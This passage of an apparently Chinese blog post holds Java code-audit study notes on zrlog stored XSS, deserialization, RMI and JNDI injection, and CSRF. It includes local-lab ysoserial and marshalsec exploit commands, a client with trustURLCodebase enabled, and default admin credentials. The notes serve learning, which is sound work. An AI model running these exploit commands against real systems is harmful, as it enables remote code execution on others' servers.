Httponly对防御xss不起作用，主要是为了解决xss漏洞后续的cookie劫持</span><br><span class="line">6.践行DOM based XSS Prevention Cheat Sheet</span><br><span class="line">	https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</span><br><span class="line"></span><br><span class="line">XSS模糊测试工具</span><br><span class="line">	XSStrike</span><br></pre></td></tr></table></figure>

<h5 id="zrlog"><a href="#zrlog" class="headerlink" title="zrlog"></a>zrlog</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">存储xss</span><br><span class="line">安装</span><br><span class="line">	https://blog.zrlog.com/post/how-to-install-zrlog</span><br><span class="line">登录后台</span><br><span class="line">/zrlog/admin/	admin admin</span><br><span class="line">在编辑处找到生成博客的包 create和update都是</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691720555988.png" alt="1691720555988"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">	&lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;JFinalFilter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;com.jfinal.core.JFinalFilter&lt;/filter-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;configClass&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;com.zrlog.web.config.ZrLogConfig&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">查看com.zrlog.web.config.ZrLogConfig</span><br><span class="line">	/WEB-INF/classes/com/zrlog/web/config/ZrLogConfig.class</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691721757162.png" alt="1691721757162"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看AdminRoutes	同级目录</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691721818664.png" alt="1691721818664"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看ArticleController</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691903676135.png" alt="1691903676135"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">articleService在 		service-1.9.1.jar中</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691927767829.png" alt="1691927767829"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上图这里60行和68行会分别修改数据库的tag和log	 以log为例</span><br><span class="line">java中的&lt;&gt;叫做泛型，括号里面的内容就是泛型的类型</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691927998887.png" alt="1691927998887"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">以log为例	找到它的类的位置 发现它继承com.jfinal.plugin.activerecord.Model</span><br><span class="line">这个类是个抽象类	提供操作数据库 序列化与反序列化的功能</span><br><span class="line">	https://blog.csdn.net/u014756827/article/details/81196985</span><br><span class="line">update()函数提供修改数据库功能函数</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691928260592.png" alt="1691928260592"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出的地方	前后端分离</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691930649439.png" alt="1691930649439"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个前端js的操作没看懂...</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691931505727.png" alt="1691931505727"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于网站标题的xss 参看</span><br><span class="line">	https://teamssix.com/211220-164519.html#toc-heading-1</span><br><span class="line">顺序是打开的4个class</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1691931690034.png" alt="1691931690034"></p>
<h3 id="5-8-不安全的反序列化"><a href="#5-8-不安全的反序列化" class="headerlink" title="5.8 不安全的反序列化"></a>5.8 不安全的反序列化</h3><h5 id="原生序列化-amp-SerializationDumper"><a href="#原生序列化-amp-SerializationDumper" class="headerlink" title="原生序列化&amp;SerializationDumper"></a>原生序列化&amp;SerializationDumper</h5><p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络中以二进制序列形式传输	输入精心构造的字节流被反序列化为恶意对象</span><br><span class="line">	fastjson将对象转换成json字符串	XMLDecoder可以将XML字符串还原成字符串</span><br><span class="line">java原生序列化和反序列化</span><br><span class="line">	需要实现Serializable</span><br><span class="line">	序列化writeObject</span><br><span class="line">	反序列化readObject</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">byte</span> <span class="variable">sex</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name,<span class="type">int</span> age,<span class="type">byte</span> sex)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                 <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                 <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                 <span class="string">&quot;, sex=&quot;</span> + sex +</span><br><span class="line">                 <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">         out.defaultWriteObject();</span><br><span class="line">         System.out.println(<span class="string">&quot;自定义的序列化过程&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ins )</span> <span class="keyword">throws</span> IOException, IOException, ClassNotFoundException &#123;</span><br><span class="line">         ins.defaultReadObject();</span><br><span class="line">         System.outprintln(<span class="string">&quot;自定义的反序列化过程&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="string">&quot;zhhhy&quot;</span>,<span class="number">18</span>, (<span class="type">byte</span>) <span class="number">1</span>);</span><br><span class="line">        saveStudent(stu);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">saveStudent</span><span class="params">(Student stu)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;stu.txt&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(stu);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Student <span class="title function_">getStudent</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> (</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;stu.txt&quot;</span>))) &#123;</span><br><span class="line">            <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student) ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> student;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	SerializationDumper	可以讲字节序列转化成可读文本</span></span><br><span class="line">java -jar SerializationDumper-v1<span class="number">.13</span>.jar -r stu.txt &gt; result.txt</span><br><span class="line">下文有介绍转化出的文本的意思</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/8686</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞产生必要条件</span><br><span class="line">	利用链又称Gadget chain</span><br><span class="line">	利用链往往由国歌类对象组成，环环相扣，下图为CVE-201504582利用链</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke() </span><br><span class="line">LazyMap.get()             </span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure>

<h5 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">RMI		java远程方法调用		JAVA Remote Method Invocation</span><br><span class="line">	允许运行在一个java虚拟机的对象调用运行在另一个java虚拟机上的对象的方法	两个虚拟机可运行在相同计算机的不同进程 也可运行在网络上不用计算机中</span><br><span class="line">	网络传输中，RMI的对象是通过序列化方式进行编码传输的，这意味着在接收到经过序列化对象后会进行反序列化</span><br><span class="line">	</span><br><span class="line">实验须修改\jdk1<span class="number">.8</span><span class="number">.0_191</span>\jre\lib\security\java.security文件</span><br><span class="line">	#sun.rmi.registryFilter=\</span><br><span class="line">	sun.rmi.registryFilter=*</span><br><span class="line"></span><br><span class="line"><span class="comment">//本地开启rmi服务		RMIDemo.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1088</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;127.0.0.1:1088&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//命令行攻击</span></span><br><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1088</span> CommonsCollections5 <span class="string">&quot;calc&quot;</span></span><br><span class="line">注意是CommonsCollections5	打错了会报错	打对了弹计算机</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692337558411.png" alt="1692337558411"></p>
<h5 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JNDI(JAVA Naming and Directory Interface)一组应用程序接口，目的是方便查找远程或本地的对象 典型应用是配置数据源 还可以访问现有的目录和服务 例如LDAP RMI CORBA DNS NIS</span><br><span class="line">当程序通过JNDI获取外部远程对象过程中，程序呗控制访问恶意的服务地址</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1-1692322862749.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">程序通过JNDI获取外部远程对象过程中，程序被控制访问恶意的服务地址(例如：指向恶意的RMI服务地址)，并加载和实例化恶意对象时，将会造成JNDI注入。JNDI利用过程如下</span><br><span class="line">	1.客户端程序中调用InitialContext.lookup(url),且url可被输入控制，指向构造好的RMI服务地址</span><br><span class="line">	2.恶意的RMI服务会向受攻击的客户端返回一个Reference，用于获取恶意的Factory类</span><br><span class="line">	3.当客户端执行lookup()时，会对恶意的Factory类进行加载并实例化，通过factory.getObjectInstance()获取外部远程对象实例</span><br><span class="line">	4.攻击者在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到远程代码执行的效果</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">javac Evil.java</span><br><span class="line">	编译出Evil.class文件</span><br><span class="line">python -m http.server</span><br><span class="line">	python3默认开启<span class="number">8000</span>端口http服务		包含class的目录</span><br><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http:<span class="comment">//127.0.0.1:8000/#Evil 1099</span></span><br><span class="line">	</span><br><span class="line">然后运行RMIClientDemo.java</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClientDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">DirContext</span> <span class="variable">dirc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>();</span><br><span class="line">        ctx.lookup(<span class="string">&quot;rmi：//localhost:1099/Evil&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">反正很玄学 	一开始不弹计算机 	然后好像是python -m http.server开启的目录改到了target/classes目录下然后弹了	有可能是Evil.java和Evil.class不能在一个目录的原因?</span><br></pre></td></tr></table></figure>







<h5 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JEP290</span><br><span class="line">	官方发布的用于缓解反序列化漏洞的措施，从8u121，7u13，6u141版本开始，JDK为RMI注册表和RMI分布式垃圾收集器内置了过滤器，只允许特定的类进行反序列化</span><br><span class="line">	https://paper.seebug.org/454/</span><br></pre></td></tr></table></figure>

<h5 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h5><h5 id="123"><a href="#123" class="headerlink" title="123"></a>123</h5><h3 id="5-9-使用含有已知漏洞的组件"><a href="#5-9-使用含有已知漏洞的组件" class="headerlink" title="5.9 使用含有已知漏洞的组件"></a>5.9 使用含有已知漏洞的组件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第三方组件</span><br><span class="line">2015	Apache Commons Collections 3.1</span><br><span class="line">2017	CVE-2017-10271	XMLDecoder未事先做好输入的过滤</span><br><span class="line">	Weblogic的WLS Security组件对外提供webservice服务</span><br><span class="line">2020	CVE-2020-2555	Oracle Coherence</span><br><span class="line">	类似Apache Commons Collections 3.1</span><br><span class="line">	</span><br><span class="line">使用开源第三方组件或CMS在安全上的一些问题</span><br><span class="line">	1.文件路劲公开透明、相对固定</span><br><span class="line">	2.漏洞点多个系统通用</span><br><span class="line">	3.有源码</span><br></pre></td></tr></table></figure>

<h5 id="第三方富文本编辑器"><a href="#第三方富文本编辑器" class="headerlink" title="第三方富文本编辑器"></a>第三方富文本编辑器</h5><h5 id="jspxcms-shiro"><a href="#jspxcms-shiro" class="headerlink" title="jspxcms shiro"></a>jspxcms shiro</h5><h3 id="5-10-不足的日志记录和监控"><a href="#5-10-不足的日志记录和监控" class="headerlink" title="5.10 不足的日志记录和监控"></a>5.10 不足的日志记录和监控</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">帮助检测、升级和应对活跃违规行为</span><br><span class="line"></span><br><span class="line">任何时候都会发生日志记录、检测、监视、主动响应不足的情况</span><br><span class="line">	1.事件	登录、登陆失败、高价值交易</span><br><span class="line">	2.警告和错误未生成日志或日志记录不充分不清晰</span><br><span class="line">	3.应用程序和API的日志未进行安全可以活动的监控</span><br><span class="line">	4.日志只存储在本地</span><br><span class="line">	5.适当的警报阈值和响应升级不到位或无效</span><br><span class="line">	6.渗透测试和动态应用安全测试DAST工具的扫描没有触发警报</span><br><span class="line">	7.应用无法实时或接近实时地检测、升级或对主动攻击发出警报</span><br><span class="line">	8.如果让用户或攻击者看到日志和警报事件，容易受到信息泄露攻击</span><br></pre></td></tr></table></figure>

<h5 id="未完不一定能够续"><a href="#未完不一定能够续" class="headerlink" title="未完不一定能够续"></a>未完不一定能够续</h5><h3 id="6-1-CSRF"><a href="#6-1-CSRF" class="headerlink" title="6.1 CSRF"></a>6.1 CSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Cross-Site Request Forgery		跨站点请求伪造</span><br><span class="line">	更改个人信息</span><br><span class="line">	添加/修改资料</span><br><span class="line">	关注/取关用户</span><br><span class="line">	发布主题或信息</span><br><span class="line">	与交易相关的操作</span><br><span class="line">检测方式</span><br><span class="line">	正常get或post请求删除referer字段再提交，若操作有效，那么基本可以去欸的那个存在CSRF漏洞</span><br><span class="line">	CSRF一般不许代码审计来挖掘，针对CSRF漏洞进行检测的工具</span><br><span class="line">		CSRFTester CSRF Request Builder</span><br><span class="line">	token、formtoken、csrf-token关键字	关注是否对Referer进行效验</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692429549552.png" alt="1692429549552"></p>
<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692429679394.png" alt="1692429679394"></p>
<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692430119802.png" alt="1692430119802"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CSRF漏洞的防御</span><br><span class="line">	STP(Synchonizer Token Pattern	令牌同步模式)</span><br><span class="line">		返回的页面镶嵌了token</span><br><span class="line">	检查Referer字段</span><br><span class="line">	添加校验token</span><br><span class="line">	验证码机制</span><br><span class="line">	自定义HTTP请求头方式</span><br><span class="line">	Origin字段</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692431026259.png" alt="1692431026259"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CSRF发起的请求不能设置自定义header</span><br><span class="line">	前端发起请求的方式</span><br><span class="line">		JS AJAX HTML表单 script标签请求 ...</span><br><span class="line">	通常来说李彤CSRF需要跨域</span><br><span class="line">	AJAX/JS跨域的方法</span><br><span class="line">		CORS(跨域资源共享)</span><br><span class="line">		JSONP</span><br><span class="line">			&lt;script src=&quot;http://xxx.a.html?callback=..&quot;&gt;</span><br><span class="line">		代理</span><br><span class="line">	 </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">快速生成CSRF POC</span><br><span class="line">	burp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSRF中以form形式提交json数据应该如何构造poc</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1692432573392.png" alt="1692432573392"></p>
